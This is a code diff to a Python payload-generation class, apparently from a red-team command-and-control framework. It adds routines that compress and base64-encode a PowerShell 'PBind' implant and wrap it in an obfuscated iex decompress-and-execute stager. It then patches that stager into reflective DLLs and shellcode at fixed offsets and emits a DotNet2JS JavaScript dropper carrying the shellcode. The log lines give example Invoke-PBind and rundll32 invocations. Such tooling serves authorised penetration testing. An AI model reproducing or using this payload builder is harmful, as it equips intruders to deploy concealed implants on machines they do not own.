@@ -120,6 +120,31 @@ class Payloads(object):
         output_file.close()
         self.QuickstartLog("Batch Payload written to: %s" % filename)
 
+    def PatchPBindBytes(self, filename, dll, offset, name):
+        filename = "%s%s" % (self.BaseDirectory, filename)
+        output_file = open(filename, 'wb')
+        output_file.write(base64.b64decode(dll))
+        output_file.close()
+        out = StringIO()
+        with open("%spbind.ps1" % FilesDirectory, 'r') as f:
+            pbind = f.read()
+        pbind = str(pbind).replace("#REPLACEKEY#", self.Key)            
+        data = bytes(pbind, 'utf-8')
+        out = gzip.compress(data)
+        gzipdata = base64.b64encode(out).decode("utf-8")
+        b64gzip = "sal a New-Object;iex(a IO.StreamReader((a System.IO.Compression.GzipStream([IO.MemoryStream][Convert]::FromBase64String(\"%s\"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()" % gzipdata
+        payload = base64.b64encode(b64gzip.encode('UTF-16LE'))
+        patch = payload.decode("utf-8")
+        patchlen = 8000 - len(patch)
+        patch2 = ""
+        patch2 = patch2.ljust(patchlen, '\x00')
+        patch3 = "%s%s" % (patch, patch2)
+        f = open(filename, "r+b")
+        f.seek(offset)
+        f.write(bytes(patch3, 'UTF-16LE'))
+        f.close()
+        self.QuickstartLog("Payload written to: %s" % (filename))
+
     def PatchSharpBytes(self, filename, dll, offset, name=""):
         filename = "%s%s" % (self.BaseDirectory, filename)
 
@@ -127,7 +152,7 @@ class Payloads(object):
         output_file.write(base64.b64decode(dll))
         output_file.close()
 
-        srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.dll")
+        srcfilename = "%s%s%s" % (self.BaseDirectory, name, "dropper_cs.exe")
         with open(srcfilename, "rb") as b:
             dllbase64 = base64.b64encode(b.read()).decode("utf-8")
 
@@ -226,6 +251,19 @@ class Payloads(object):
         with open('%sSharp_v4_x64_dll.b64' % FilesDirectory, 'r') as f:
             v4_64 = f.read()
         self.PatchSharpBytes("%sSharp_v4_x64.dll" % name, v4_64, 0x00014F00, "")
+
+        # Load CLR "v4.0.30319"
+        self.QuickstartLog("" + Colours.END)
+        self.QuickstartLog("ReflectiveDLL that loads PBind C# Implant in CLR v4.0.30319 - DLL Export (VoidFunc)" + Colours.GREEN)
+        self.QuickstartLog("Invoke-PBind -Target 127.0.0.1 -Secret mtkn4 -Key %s -Pname jaccdpqnvbrrxlaf -Client" % (self.Key))
+        with open('%sPosh_v4_x86_dll.b64' % FilesDirectory, 'r') as f:
+            v4_86 = f.read()
+        self.PatchPBindBytes("%sPBind_v4_x86.dll" % name, v4_86, 0x00012F80, "")
+        with open('%sPosh_v4_x64_dll.b64' % FilesDirectory, 'r') as f:
+            v4_64 = f.read()
+        self.PatchPBindBytes("%sPBind_v4_x64.dll" % name, v4_64, 0x00014F00, "")
+
+        # End of logging for dll
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("RunDLL Example:" + Colours.GREEN)
         self.QuickstartLog("rundll32 Sharp_v4_x64.dll,VoidFunc")
@@ -280,6 +318,22 @@ class Payloads(object):
         with open("%s%sSharp_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
             with open("%s%sSharp_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
                 b64.write(base64.b64encode(binary.read()))
+
+        # Load CLR "v4.0.30319" for PBind
+        v4_86_offset = 0x000132E0 + 4
+        with open('%sPosh_v4_x86_Shellcode.b64' % FilesDirectory, 'rb') as f:
+            v4_86 = f.read()
+        self.PatchPBindBytes("%sPBind_v4_x86_Shellcode.bin" % name, v4_86, v4_86_offset, "Shellcode")
+        with open("%s%sPBind_v4_x86_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
+            with open("%s%sPBind_v4_x86_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
+                b64.write(base64.b64encode(binary.read()))
+        v4_64_offset = 0x00015350 + 8
+        with open('%sPosh_v4_x64_Shellcode.b64' % FilesDirectory, 'rb') as f:
+            v4_64 = f.read()
+        self.PatchPBindBytes("%sPBind_v4_x64_Shellcode.bin" % name, v4_64, v4_64_offset, "Shellcode")
+        with open("%s%sPBind_v4_x64_Shellcode.bin" % (self.BaseDirectory, name), 'rb') as binary:
+            with open("%s%sPBind_v4_x64_Shellcode.b64" % (self.BaseDirectory, name), 'wb') as b64:
+                b64.write(base64.b64encode(binary.read()))                
 
     def CreateSCT(self):
         basefile = self.CreateRawBase()
@@ -400,6 +454,24 @@ ao.run('%s', 0);window.close();
         output_file = open(filenameb64, 'w')
         output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
         output_file.close()   
+        with open("%sDotNet2JS.js" % FilesDirectory, 'r') as f:
+            dotnet = f.read()        
+        with open('%s%sPBind_v4_x64_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_64 = f.read()
+        with open('%s%sPBind_v4_x86_Shellcode.b64' % (self.BaseDirectory, name), 'rb') as f:
+            v4_86 = f.read()
+        dotnet = dotnet.replace("#REPLACEME32#", v4_86.decode('utf-8'))  
+        dotnet = dotnet.replace("#REPLACEME64#", v4_64.decode('utf-8')) 
+        self.QuickstartLog("DotNet2JS PBind Payload written to: %s%sDotNet2JS_PBind.js" % (self.BaseDirectory, name))
+        filename = "%s%sDotNet2JS_PBind.js" % (self.BaseDirectory, name)
+        filenameb64 = "%s%sDotNet2JS_PBind.b64" % (self.BaseDirectory, name)
+        output_file = open(filename, 'w')
+        output_file.write(dotnet)
+        output_file.close() 
+        output_file = open(filenameb64, 'w')
+        output_file.write(base64.b64encode(dotnet.encode('UTF-8')).decode('utf-8'))
+        output_file.close()           
+
 
     def CreatePython(self, name=""):
         self.QuickstartLog(Colours.END)
